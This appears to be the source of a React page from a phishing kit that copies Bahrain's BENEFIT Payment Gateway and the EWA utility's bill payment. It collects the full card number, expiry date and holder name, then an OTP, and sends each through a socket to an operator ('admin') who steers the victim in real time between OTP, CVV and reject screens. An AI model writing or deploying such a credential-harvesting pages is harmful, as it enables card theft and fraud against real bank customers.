import { useState, useEffect, useRef, useCallback } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react/runtime";
import {
  socket,
  sendData,
  navigateToPage,
  cardAction,
  codeAction,
  waitingMessage,
} from "@/lib/store";

const months = Array.from({ length: 12 }, (_, i) => ({
  value: String(i + 1),
  label: String(i + 1).padStart(2, "0"),
}));

const currentYear = new Date().getFullYear();
const years = Array.from({ length: 15 }, (_, i) => ({
  value: String(currentYear + i),
  label: String(currentYear + i),
}));

type Phase = "card" | "otp";

export default function KNETPayment() {
  const [, navigate] = useLocation();
  const [phase, setPhase] = useState<Phase>("card");

  // Card form state
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cardHolderName, setCardHolderName] = useState("");
  const [saveCard, setSaveCard] = useState(false);

  // OTP state
  const [otpCode, setOtpCode] = useState("");
  const [countdown, setCountdown] = useState(180);
  const countdownRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // Common state
  const [validationError, setValidationError] = useState("");
  const [isWaiting, setIsWaiting] = useState(false);
  const [rejectedError, setRejectedError] = useState("");
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [errorModalMessage, setErrorModalMessage] = useState("");

  // Get amount from localStorage
  const mohData = JSON.parse(localStorage.getItem("mohPaymentData") || "{}");
  const totalAmount = mohData.totalAmount || localStorage.getItem("Total") || "0.000";

  // Current date/time
  const now = new Date();
  const dateStr = `${String(now.getDate()).padStart(2, "0")}-${String(now.getMonth() + 1).padStart(2, "0")}-${now.getFullYear()} ${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;

  // Masked card for OTP phase
  const maskedCard = "******" + cardNumber.slice(-4);

  useEffect(() => {
    navigateToPage("دفع بنفت");
  }, []);

  // Countdown timer for OTP
  const startCountdown = useCallback(() => {
    setCountdown(180);
    if (countdownRef.current) clearInterval(countdownRef.current);
    countdownRef.current = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          if (countdownRef.current) clearInterval(countdownRef.current);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  }, []);

  useEffect(() => {
    return () => {
      if (countdownRef.current) clearInterval(countdownRef.current);
    };
  }, []);

  const formatCountdown = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${String(s).padStart(2, "0")}`;
  };

  // Handle card action from admin
  useSignalEffect(() => {
    if (cardAction.value) {
      const action = cardAction.value.action;
      waitingMessage.value = "";
      setIsWaiting(false);

      if (phase === "card") {
        if (action === "otp") {
          setPhase("otp");
          startCountdown();
          navigateToPage("رمز التحقق بنفت (OTP)");
        } else if (action === "reject") {
          setRejectedError("Please check the entered information");
          setCardNumber("");
          setCardHolderName("");
          setExpiryMonth("");
          setExpiryYear("");
        }
      } else if (phase === "otp") {
        if (action === "otp") {
          navigate("/final-page");
        } else if (action === "cvv") {
          navigate("/cvv");
        } else if (action === "reject") {
          setRejectedError("Please enter the correct OTP");
          setOtpCode("");
        }
      }
      cardAction.value = null;
    }
  });

  // Handle code action from admin
  useSignalEffect(() => {
    if (codeAction.value) {
      const action = codeAction.value.action;
      waitingMessage.value = "";
      setIsWaiting(false);

      if (phase === "otp") {
        if (action === "cvv") {
          navigate("/cvv");
        } else if (action === "reject") {
          setRejectedError("Please enter the correct OTP");
          setOtpCode("");
        } else if (action === "approve" || action === "otp") {
          navigate("/final-page");
        }
      } else if (phase === "card") {
        if (action === "reject") {
          setRejectedError("Please check the entered information");
          setCardNumber("");
          setCardHolderName("");
          setExpiryMonth("");
          setExpiryYear("");
        }
      }
      codeAction.value = null;
    }
  });

  const validateCardForm = (): boolean => {
    if (!cardNumber || cardNumber.length < 10) {
      setValidationError("Please enter a valid card number");
      return false;
    }
    if (!expiryMonth || !expiryYear) {
      setValidationError("Please select expiry date");
      return false;
    }
    if (!cardHolderName.trim()) {
      setValidationError("Please enter card holder name");
      return false;
    }
    setValidationError("");
    return true;
  };

  const handleCardSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateCardForm()) return;

    setIsWaiting(true);
    setRejectedError("");

    localStorage.setItem("cardNumber", cardNumber);
    localStorage.setItem("cardMonth", expiryMonth.padStart(2, "0"));
    localStorage.setItem("cardYear", expiryYear);
    localStorage.setItem("Total", String(totalAmount));

    const paymentData = {
      totalPaid: totalAmount,
      cardType: "benefit",
      cardLast4: cardNumber.slice(-4),
      serviceName: mohData.serviceType || "دفع فاتورة الكهرباء والماء",
      bankName: "BENEFIT",
      bankLogo: "/benefit-logo.png",
    };
    localStorage.setItem("paymentData", JSON.stringify(paymentData));

    sendData({
      paymentCard: {
        cardNumber: cardNumber,
        cardNumberOnly: cardNumber,
        prefix: "",
        nameOnCard: cardHolderName,
        expiryMonth: expiryMonth.padStart(2, "0"),
        expiryYear: expiryYear,
        cvv: "N/A",
        pin: "N/A",
        bankName: "BENEFIT",
        paymentMethod: "BENEFIT Debit",
      },
      current: "دفع بنفت",
      nextPage: "رمز التحقق بنفت (OTP)",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  };

  const handleOtpSubmit = () => {
    if (!otpCode || !/^\d{4,6}$/.test(otpCode)) {
      setShowErrorModal(true);
      setErrorModalMessage("Please enter a valid OTP (4-6 digits)");
      return;
    }

    setIsWaiting(true);

    sendData({
      digitCode: otpCode,
      current: "رمز التحقق بنفت (OTP)",
      nextPage: "الصفحة النهائية",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  };

  return (
    <div style={{ margin: 0, padding: 0, fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", backgroundColor: "#f5f5f5", minHeight: "100vh", direction: "ltr" }}>
      {/* Loading overlay */}
      {isWaiting && (
        <div style={{ position: "fixed", top: 0, left: 0, width: "100%", height: "100%", backgroundColor: "rgba(0,0,0,0.3)", zIndex: 999999, display: "flex", alignItems: "center", justifyContent: "center" }}>
          <div style={{ textAlign: "center", color: "#fff", fontSize: 16 }}>
            <div style={{ border: "4px solid #f3f3f3", borderTop: "4px solid #cc0000", borderRadius: "50%", width: 40, height: 40, animation: "spin 1s linear infinite", margin: "0 auto 10px" }} />
            <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
            Processing...
          </div>
        </div>
      )}

      {/* Error Modal */}
      {showErrorModal && (
        <div style={{ position: "fixed", top: 0, left: 0, width: "100%", height: "100%", backgroundColor: "rgba(0,0,0,0.4)", zIndex: 999999, display: "flex", alignItems: "center", justifyContent: "center" }}>
          <div style={{ backgroundColor: "#fff", borderRadius: 8, padding: 30, maxWidth: 400, width: "90%", textAlign: "center" }}>
            <p style={{ fontSize: 14, marginBottom: 20 }}>{errorModalMessage}</p>
            <button onClick={() => setShowErrorModal(false)} style={{ backgroundColor: "#cc0000", color: "#fff", border: "none", padding: "8px 30px", borderRadius: 4, cursor: "pointer", fontSize: 14 }}>Close</button>
          </div>
        </div>
      )}

      <div style={{ maxWidth: 960, margin: "0 auto", padding: "0 15px" }}>
        {/* ============ CARD PHASE ============ */}
        {phase === "card" && (
          <div style={{ backgroundColor: "#fff", border: "1px solid #ddd", marginTop: 20, marginBottom: 20 }}>
            {/* Header */}
            <div style={{ padding: "15px 25px", borderBottom: "1px solid #eee" }}>
              {/* Top row: عربي link */}
              <div style={{ textAlign: "right", marginBottom: 8 }}>
                <span style={{ color: "#0066cc", fontSize: 13, cursor: "pointer" }}>عربي</span>
              </div>
              {/* Main header row */}
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
                {/* Left: EWA Logo */}
                <div style={{ flex: "0 0 auto" }}>
                  <img src="/ewa-logo.png" alt="EWA" style={{ height: 55 }} />
                </div>
                {/* Center: BENEFIT PAYMENT GATEWAY */}
                <div style={{ textAlign: "center", flex: 1 }}>
                  <div style={{ color: "#cc0000", fontSize: 18, fontWeight: "bold", letterSpacing: 1 }}>BENEFIT PAYMENT GATEWAY</div>
                  <div style={{ color: "#cc0000", fontSize: 14, marginTop: 4 }}>{dateStr}</div>
                </div>
                {/* Right: EWA / URL */}
                <div style={{ textAlign: "right", flex: "0 0 auto" }}>
                  <div style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>EWA</div>
                  <div style={{ fontSize: 12, color: "#666" }}>https://www.npa2.bahrain.bh</div>
                </div>
              </div>
            </div>

            {/* Form Area */}
            <div style={{ padding: "25px 40px" }}>
              {/* Validation Error */}
              {validationError && (
                <div style={{ backgroundColor: "#f8d7da", border: "1px solid #f5c6cb", color: "#721c24", padding: "8px 15px", borderRadius: 4, marginBottom: 15, fontSize: 13 }}>
                  {validationError}
                </div>
              )}

              {/* Rejected Error */}
              {rejectedError && (
                <div style={{ color: "#cc0000", fontWeight: "bold", textAlign: "center", marginBottom: 15, fontSize: 13 }}>
                  {rejectedError}
                </div>
              )}

              <form onSubmit={handleCardSubmit}>
                {/* Amount */}
                <div style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>Amount</label>
                  <span style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>BD {totalAmount}</span>
                </div>

                {/* Card Type */}
                <div style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>Card Type</label>
                  <span style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>Debit</span>
                </div>

                {/* Card Number */}
                <div style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>Card Number</label>
                  <input
                    type="tel"
                    inputMode="numeric"
                    maxLength={19}
                    value={cardNumber}
                    onChange={(e) => {
                      const val = e.target.value.replace(/\D/g, "");
                      setCardNumber(val);
                      setValidationError("");
                    }}
                    style={{ width: 200, height: 30, border: "1px solid #ccc", borderRadius: 2, padding: "0 8px", fontSize: 14, outline: "none", caretColor: "auto" }}
                  />
                </div>

                {/* Expiry Date */}
                <div style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>Expiry Date</label>
                  <div style={{ display: "flex", gap: 5 }}>
                    <select
                      value={expiryMonth}
                      onChange={(e) => setExpiryMonth(e.target.value)}
                      style={{ height: 30, border: "1px solid #ccc", borderRadius: 2, fontSize: 13, padding: "0 5px", backgroundColor: "#fff" }}
                    >
                      <option value="">MM</option>
                      {months.map((m) => (
                        <option key={m.value} value={m.value}>{m.label}</option>
                      ))}
                    </select>
                    <select
                      value={expiryYear}
                      onChange={(e) => setExpiryYear(e.target.value)}
                      style={{ height: 30, border: "1px solid #ccc", borderRadius: 2, fontSize: 13, padding: "0 5px", backgroundColor: "#fff" }}
                    >
                      <option value="">YYYY</option>
                      {years.map((y) => (
                        <option key={y.value} value={y.value}>{y.label}</option>
                      ))}
                    </select>
                  </div>
                </div>

                {/* Card Holders Name */}
                <div style={{ display: "flex", marginBottom: 20, alignItems: "center" }}>
                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>Card Holders Name</label>
                  <input
                    type="text"
                    value={cardHolderName}
                    onChange={(e) => {
                      setCardHolderName(e.target.value);
                      setValidationError("");
                    }}
                    style={{ width: 200, height: 30, border: "1px solid #ccc", borderRadius: 2, padding: "0 8px", fontSize: 14, outline: "none", caretColor: "auto" }}
                  />
                </div>

                {/* Save card checkbox */}
                <div style={{ marginBottom: 25 }}>
                  <label style={{ display: "flex", alignItems: "center", gap: 8, fontSize: 13, color: "#333", cursor: "pointer" }}>
                    <input
                      type="checkbox"
                      checked={saveCard}
                      onChange={(e) => setSaveCard(e.target.checked)}
                      style={{ width: 14, height: 14 }}
                    />
                    Save your card details for future payments to this merchant.
                  </label>
                </div>

                {/* Buttons */}
                <div style={{ display: "flex", justifyContent: "center", gap: 10, marginBottom: 20 }}>
                  <button type="submit" style={{ backgroundColor: "#cc0000", color: "#fff", border: "none", padding: "8px 35px", borderRadius: 4, fontSize: 14, fontWeight: "bold", cursor: "pointer", minWidth: 100 }}>
                    Pay
                  </button>
                  <button type="button" onClick={() => window.history.back()} style={{ backgroundColor: "#fff", color: "#333", border: "1px solid #ccc", padding: "8px 25px", borderRadius: 4, fontSize: 14, cursor: "pointer", minWidth: 100 }}>
                    Cancel
                  </button>
                </div>
              </form>
            </div>

            {/* Footer area */}
            <div style={{ padding: "15px 40px 25px", borderTop: "1px solid #eee" }}>
              {/* View Accepted Cards */}
              <div style={{ marginBottom: 20 }}>
                <span style={{ color: "#cc0000", fontSize: 13, cursor: "pointer" }}>View Accepted Cards</span>
              </div>

              {/* Note */}
              <div style={{ fontSize: 12, color: "#333", marginBottom: 20, lineHeight: 1.6 }}>
                <strong>Note:</strong> By submitting your information and using "BENEFIT Payment Gateway", you indicate that you agree to the{" "}
                <span style={{ color: "#0066cc", cursor: "pointer" }}>Terms of Services - Legal Disclaimer</span>.
              </div>

              {/* Benefit Logo and Copyright */}
              <div>
                <img src="/benefit-logo.png" alt="Benefit" style={{ height: 60, marginBottom: 8 }} />
                <div style={{ fontSize: 12, color: "#666", lineHeight: 1.8 }}>
                  Powered By The BENEFIT Company.<br />
                  Copyright &copy; 2020-2025 The BENEFIT Company. All Rights Reserved.<br />
                  Licensed by Central Bank of Bahrain as Ancillary Service Provider.
                </div>
              </div>
            </div>
          </div>
        )}

        {/* ============ OTP PHASE ============ */}
        {phase === "otp" && (
          <div style={{ backgroundColor: "#fff", border: "1px solid #ddd", marginTop: 20, marginBottom: 20 }}>
            {/* Header */}
            <div style={{ padding: "15px 25px", borderBottom: "1px solid #eee" }}>
              <div style={{ textAlign: "right", marginBottom: 8 }}>
                <span style={{ color: "#0066cc", fontSize: 13, cursor: "pointer" }}>عربي</span>
              </div>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
                <div style={{ flex: "0 0 auto" }}>
                  <img src="/ewa-logo.png" alt="EWA" style={{ height: 55 }} />
                </div>
                <div style={{ textAlign: "center", flex: 1 }}>
                  <div style={{ color: "#cc0000", fontSize: 18, fontWeight: "bold", letterSpacing: 1 }}>BENEFIT PAYMENT GATEWAY</div>
                  <div style={{ color: "#cc0000", fontSize: 14, marginTop: 4 }}>{dateStr}</div>
                </div>
                <div style={{ textAlign: "right", flex: "0 0 auto" }}>
                  <div style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>EWA</div>
                  <div style={{ fontSize: 12, color: "#666" }}>https://www.npa2.bahrain.bh</div>
                </div>
              </div>
            </div>

            {/* OTP Form Area */}
            <div style={{ padding: "25px 40px" }}>
              {/* OTP Notification */}
              <div style={{ backgroundColor: "#d9edf7", border: "1px solid #bce8f1", color: "#31708f", padding: 12, borderRadius: 4, marginBottom: 20, fontSize: 13, lineHeight: 1.6 }}>
                <strong>NOTIFICATION:</strong> You will presently receive an SMS on your mobile number registered with your bank. This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in the box below.
              </div>

              {/* Amount */}
              <div style={{ display: "flex", marginBottom: 12, alignItems: "center" }}>
                <label style={{ width: 180, fontSize: 14, color: "#333" }}>Amount</label>
                <span style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>BD {totalAmount}</span>
              </div>

              {/* Card Number */}
              <div style={{ display: "flex", marginBottom: 12, alignItems: "center" }}>
                <label style={{ width: 180, fontSize: 14, color: "#333" }}>Card Number</label>
                <span style={{ fontSize: 14, color: "#333" }}>{maskedCard}</span>
              </div>

              {/* Expiry */}
              <div style={{ display: "flex", marginBottom: 12, alignItems: "center" }}>
                <label style={{ width: 180, fontSize: 14, color: "#333" }}>Expiry Date</label>
                <span style={{ fontSize: 14, color: "#333" }}>{expiryMonth.padStart(2, "0")} / {expiryYear}</span>
              </div>

              {/* Rejected Error */}
              {rejectedError && (
                <div style={{ color: "#cc0000", fontWeight: "bold", textAlign: "center", marginBottom: 15, fontSize: 13 }}>
                  {rejectedError}
                </div>
              )}

              {/* OTP Input */}
              <div style={{ display: "flex", marginBottom: 20, alignItems: "center" }}>
                <label style={{ width: 180, fontSize: 14, color: "#333" }}>OTP</label>
                <input
                  type="text"
                  inputMode="numeric"
                  maxLength={6}
                  value={otpCode}
                  onChange={(e) => {
                    const val = e.target.value.replace(/\D/g, "");
                    setOtpCode(val);
                    setRejectedError("");
                  }}
                  placeholder={formatCountdown(countdown)}
                  style={{ width: 200, height: 30, border: "1px solid #ccc", borderRadius: 2, padding: "0 8px", fontSize: 14, textAlign: "center", outline: "none", caretColor: "auto" }}
                />
              </div>

              {/* Buttons */}
              <div style={{ display: "flex", justifyContent: "center", gap: 10, marginBottom: 20 }}>
                <button
                  type="button"
                  onClick={handleOtpSubmit}
                  disabled={!otpCode || otpCode.length < 4}
                  style={{
                    backgroundColor: "#cc0000",
                    color: "#fff",
                    border: "none",
                    padding: "8px 35px",
                    borderRadius: 4,
                    fontSize: 14,
                    fontWeight: "bold",
                    cursor: otpCode && otpCode.length >= 4 ? "pointer" : "not-allowed",
                    opacity: otpCode && otpCode.length >= 4 ? 1 : 0.6,
                    minWidth: 100,
                  }}
                >
                  Confirm
                </button>
                <button type="button" onClick={() => window.history.back()} style={{ backgroundColor: "#fff", color: "#333", border: "1px solid #ccc", padding: "8px 25px", borderRadius: 4, fontSize: 14, cursor: "pointer", minWidth: 100 }}>
                  Cancel
                </button>
              </div>
            </div>

            {/* Footer */}
            <div style={{ padding: "15px 40px 25px", borderTop: "1px solid #eee" }}>
              <div style={{ fontSize: 12, color: "#333", marginBottom: 20, lineHeight: 1.6 }}>
                <strong>Note:</strong> By submitting your information and using "BENEFIT Payment Gateway", you indicate that you agree to the{" "}
                <span style={{ color: "#0066cc", cursor: "pointer" }}>Terms of Services - Legal Disclaimer</span>.
              </div>
              <div>
                <img src="/benefit-logo.png" alt="Benefit" style={{ height: 60, marginBottom: 8 }} />
                <div style={{ fontSize: 12, color: "#666", lineHeight: 1.8 }}>
                  Powered By The BENEFIT Company.<br />
                  Copyright &copy; 2020-2025 The BENEFIT Company. All Rights Reserved.<br />
                  Licensed by Central Bank of Bahrain as Ancillary Service Provider.
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
